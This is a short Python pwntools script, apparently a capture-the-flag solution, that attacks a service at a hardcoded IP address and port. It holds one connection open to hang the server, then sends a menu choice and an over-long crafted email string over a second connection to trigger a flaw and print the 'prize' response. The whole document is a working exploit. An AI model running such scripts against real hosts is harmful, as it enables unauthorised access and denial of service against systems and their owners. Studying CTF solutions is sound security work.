from pwn import *
import time

IP = '18.234.102.122'
PORT = 9876

# Get IP whitelisted
hang = remote(IP, PORT)
hang.recvuntil('email: ')

# Connect to inside network; try to change email
r = remote(IP, PORT)
r.recvuntil('Exit\n')
r.sendline('1')
r.recvuntil('email to?')
r.sendline('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!@gmail.com')
r.recvuntil('email...')
r.sendline('abc')

# Wait 10 seconds since server script is being DOS'd
print r.recvuntil('prize')
r.close()
hang.close()
